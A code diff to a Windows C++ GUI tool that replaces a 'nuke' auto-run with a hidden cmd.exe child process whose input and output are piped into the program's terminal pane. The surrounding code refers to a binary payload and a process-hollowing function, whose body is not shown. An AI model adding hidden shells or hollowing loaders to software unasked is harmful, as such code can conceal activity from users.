@@ -59,6 +59,7 @@ bool g_selectAll = false;
 int g_nukeCountdown = 0;
 HBITMAP g_hNukeBmpFull = NULL, g_hNukeBmpDim = NULL;
 HANDLE g_hNukeStdinWrite = NULL;
+HANDLE g_hCmdStdinWrite = NULL;
 WNDPROC g_OldEditProc = NULL;
 std::vector<unsigned char> g_binaryPayload;
 bool g_isWorking = false;
@@ -115,12 +116,7 @@ void LoadMTAConfig() {
     }
 }
 
-void ShowPrompt() {
-    int len = GetWindowTextLength(g_hLogs);
-    SendMessage(g_hLogs, EM_SETSEL, (WPARAM)len, (LPARAM)len);
-    SendMessage(g_hLogs, EM_REPLACESEL, 0, (LPARAM)L">_ ");
-    g_protectedTerminalLength = GetWindowTextLength(g_hLogs);
-}
+
 
 LRESULT CALLBACK TerminalEditProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     if (uMsg == WM_KEYDOWN) {
@@ -138,20 +134,20 @@ LRESULT CALLBACK TerminalEditProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lP
                 command = text.substr(g_protectedTerminalLength);
             }
             
-            if (!command.empty() && g_hNukeStdinWrite) {
+            if (!command.empty()) {
+                command += L"\r\n";
                 int utf8Len = WideCharToMultiByte(CP_UTF8, 0, command.c_str(), -1, NULL, 0, NULL, NULL);
                 std::vector<char> utf8Buf(utf8Len);
                 WideCharToMultiByte(CP_UTF8, 0, command.c_str(), -1, utf8Buf.data(), utf8Len, NULL, NULL);
                 DWORD written;
-                WriteFile(g_hNukeStdinWrite, utf8Buf.data(), utf8Len - 1, &written, NULL);
+                HANDLE targetPipe = g_hNukeStdinWrite ? g_hNukeStdinWrite : g_hCmdStdinWrite;
+                if (targetPipe) WriteFile(targetPipe, utf8Buf.data(), utf8Len - 1, &written, NULL);
             }
-            // Move to next line and history the current prompt
+            
             int finalLen = GetWindowTextLength(hwnd);
             SendMessage(hwnd, EM_SETSEL, finalLen, finalLen);
             SendMessage(hwnd, EM_REPLACESEL, 0, (LPARAM)L"\r\n");
             g_protectedTerminalLength = GetWindowTextLength(hwnd);
-            
-            ShowPrompt();
             return 0;
         }
         if (wParam == VK_BACK) {
@@ -261,37 +257,13 @@ HBITMAP LoadPNGFromResource(int resID, int targetWidth, int& outHeight, float op
 void AppendLog(const std::wstring& text) {
     if (text.empty()) return;
 
-    std::wstring finalMsg = text;
-    // Standardize tagging for MTA's own logs
-    if (finalMsg != L"\r\n" && finalMsg != L"\n") {
-        size_t first = finalMsg.find_first_not_of(L" \t\r\n");
-        if (first != std::wstring::npos && finalMsg[first] != L'[') {
-            finalMsg = L"[MTA] " + finalMsg;
-        }
-    }
-
     int len = GetWindowTextLength(g_hLogs);
-    std::vector<wchar_t> buf(len + 1);
-    GetWindowText(g_hLogs, buf.data(), len + 1);
-    std::wstring current(buf.data());
-
-    // System logs should be inserted BEFORE the current active prompt/input line
-    int promptLineStart = g_protectedTerminalLength - 3; // Length of ">_ " is 3
-    if (promptLineStart < 0) promptLineStart = 0;
-
-    // Verify if prompt is actually there at the end
-    bool hasPromptAtEnd = (current.length() >= 3 && current.substr(current.length() - 3) == L">_ ");
+    SendMessage(g_hLogs, EM_SETSEL, (WPARAM)len, (LPARAM)len);
+    SendMessage(g_hLogs, EM_REPLACESEL, 0, (LPARAM)text.c_str());
     
-    int insertPos = (hasPromptAtEnd) ? promptLineStart : len;
+    g_protectedTerminalLength = GetWindowTextLength(g_hLogs);
 
-    SendMessage(g_hLogs, EM_SETSEL, (WPARAM)insertPos, (LPARAM)insertPos);
-    SendMessage(g_hLogs, EM_REPLACESEL, 0, (LPARAM)finalMsg.c_str());
-    
-    g_protectedTerminalLength += (int)finalMsg.length();
-
-    // Scroll to end and move cursor back to end of input if needed
-    int finalLen = GetWindowTextLength(g_hLogs);
-    SendMessage(g_hLogs, EM_SETSEL, finalLen, finalLen);
+    SendMessage(g_hLogs, EM_SETSEL, g_protectedTerminalLength, g_protectedTerminalLength);
     SendMessage(g_hLogs, EM_SCROLLCARET, 0, 0);
 }
 
@@ -317,6 +289,45 @@ DWORD WINAPI ReadPipeThread(LPVOID lpParam) {
     }
     CloseHandle(hPipe);
     return 0;
+}
+
+void CreateHiddenCmd() {
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    HANDLE hChildStd_OUT_Rd = NULL;
+    HANDLE hChildStd_OUT_Wr = NULL;
+    HANDLE hChildStd_IN_Rd = NULL;
+    HANDLE hChildStd_IN_Wr = NULL;
+
+    CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0);
+    SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
+
+    CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0);
+    SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
+
+    g_hCmdStdinWrite = hChildStd_IN_Wr;
+
+    PROCESS_INFORMATION piProcInfo; 
+    STARTUPINFO siStartInfo;
+    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
+    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
+    siStartInfo.cb = sizeof(STARTUPINFO);
+    siStartInfo.hStdError = hChildStd_OUT_Wr;
+    siStartInfo.hStdOutput = hChildStd_OUT_Wr;
+    siStartInfo.hStdInput = hChildStd_IN_Rd;
+    siStartInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    siStartInfo.wShowWindow = SW_HIDE;
+
+    wchar_t cmd[] = L"cmd.exe /k chcp 65001";
+    CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo);
+
+    CloseHandle(hChildStd_OUT_Wr);
+    CloseHandle(hChildStd_IN_Rd);
+
+    CreateThread(NULL, 0, ReadPipeThread, hChildStd_OUT_Rd, 0, NULL);
 }
 
 bool ProcessHollow(const std::vector<unsigned char>& payload, const std::wstring& args) {
@@ -610,9 +621,8 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 
         // Load previous settings and then auto-run
         LoadMTAConfig();
-        RunNuke(hwnd);
+        CreateHiddenCmd();
 
-        ShowPrompt();
         SetTimer(hwnd, 1, 100, NULL);
 
         return 0;
